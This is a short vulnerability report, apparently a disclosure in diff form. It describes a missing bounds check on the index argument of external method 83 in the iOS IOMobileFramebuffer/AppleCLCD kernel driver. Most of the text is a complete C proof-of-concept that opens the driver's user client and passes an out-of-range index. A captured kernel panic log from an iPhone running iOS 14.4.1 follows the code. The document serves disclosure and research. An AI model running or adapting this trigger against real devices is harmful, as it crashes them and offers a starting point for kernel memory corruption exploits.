@@ -1,0 +1,58 @@
+Very straightforward vulnerability: the last external method (selector 83) of AppleCLCD/IOMobileFramebuffer (they share the same sMethods table) lacks any bound checks on the index given as the input[0], the first scalar to the method. The following POC triggers a panic:
+
+void trigger_clcd_vuln(void) {
+  kern_return_t ret;
+  io_connect_t shared_user_client_conn = MACH_PORT_NULL;
+  int type = 2;
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
+                            IOServiceMatching("IOMobileFramebuffer"));
+   
+  if(service == MACH_PORT_NULL) {
+    printf("failed to open service\n");
+    return;
+  }
+   
+  printf("service: 0x%x\n", service);
+
+  ret = IOServiceOpen(service, mach_task_self(), type, &shared_user_client_conn);
+  if(ret != KERN_SUCCESS) {
+    printf("failed to open userclient: %s\n", mach_error_string(ret));
+    return;
+  }
+   
+  printf("client: 0x%x\n", shared_user_client_conn);
+   
+  printf("call externalMethod\n");
+  uint64_t scalars[4] = { 0x0 };
+  scalars[0] = 0x41414141;
+
+  uint64_t output_scalars[4] = { 0 };
+  uint32_t output_scalars_size = 1;
+
+  printf("call s_default_fb_surface\n");
+  ret = IOConnectCallMethod(shared_user_client_conn, 83,
+           scalars, 1,
+    	      NULL, 0, //input, input_size,
+    		  output_scalars, &output_scalars_size,
+        	  NULL, NULL); //output, &output_size);
+
+  if(ret != KERN_SUCCESS) {
+    printf("failed to call external method: 0x%x --> %s\n", ret, mach_error_string(ret));
+    return;
+  }
+   
+  printf("external method returned KERN_SUCCESS\n");
+   
+  IOServiceClose(shared_user_client_conn);
+  printf("success!\n");
+}
+
+The panic:
+
+  "build" : "iPhone OS 14.4.1 (18D61)",
+  "product" : "iPhone10,3",
+  "kernel" : "Darwin Kernel Version 20.3.0: Tue Jan  5 18:34:47 PST 2021; root:xnu-7195.80.35~2\/RELEASE_ARM64_T8015",
+  "incident" : "5526E312-E093-4A29-8366-248751EB20DC",
+  "crashReporterKey" : "b03b0cfc811a7f8e91fa5e0678362b6b3190450e",
+  "date" : "2021-03-29 02:37:43.07 +0300",
+  "panicString" : "panic(cpu 1 caller 0xfffffff027e53660): Kernel data abort. at pc 0xfffffff0282e8830, lr 0xfffffff0282dbb68 (saved state: 0xffffffe811c63420)\n\t  x0: 0xffffffe4cdc7ccb0  x1:  0xffffffe19c2a0628  x2:  0xffffffe811c637fc  x3:  0x0000000041414141\n\t  x4: 0x0000000000000000  x5:  0x0000000000000000  x6:  0x0000000000000000  x7:  0x0000000000000a10\n\t  x8: 0xffffffe4cdc7ccb0  x9:  0x0000000041414141  x10: 0xffffffe6d7d1e110  x11: 0x0000000041414141\n\t  x12: 0x0000000000000002 x13: 0x0000000000000002  x14: 0xffffffe19bcdeee8  x15: 0x0000000000000003\n\t  x16: 0x0000000000008000 x17: 0xfffffff027e50b28  x18: 0xfffffff027e45000  x19: 0xffffffe811c63940\n\t  x20: 0x0000000000000000 x21: 0xffffffe4cdc58000  x22: 0xfffffff027645a08  x23: 0x00000000e00002c2\n\t  x24: 0x0000000000000000 x25: 0xffffffe811c63aec  x26: 0xffffffe4ce60d570  x27: 0xffffffe4cdf1df44\n\t  x28: 0x0000000000000000 fp:  0xffffffe811c637a0  lr:  0xfffffff0282dbb68  sp:  0xffffffe811c63770\n\t  pc:  0xfffffff0282e8830 cpsr: 0x60400204         esr: 0x96000006          far: 0xffffffe6d7d1e110\n\nDebugger message: panic\nMemory ID: 0x1\nOS release type:
